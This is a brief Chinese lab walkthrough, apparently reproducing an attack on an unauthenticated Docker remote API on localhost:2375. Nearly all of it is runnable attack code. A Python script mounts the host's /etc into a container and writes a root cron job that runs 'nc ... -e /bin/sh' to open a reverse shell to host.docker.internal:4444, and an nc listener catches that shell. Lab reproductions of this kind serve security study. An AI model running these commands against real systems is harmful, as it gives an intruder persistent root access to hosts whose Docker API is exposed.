开启环境：
```
docker compose up -d
```
先安装所需的Python库：
```
pip install docker
```
创建一个脚本：
```
import docker

client = docker.DockerClient(base_url='http://localhost:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc host.docker.internal 4444 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```
开启监听：
```
nc -lv 4444
```
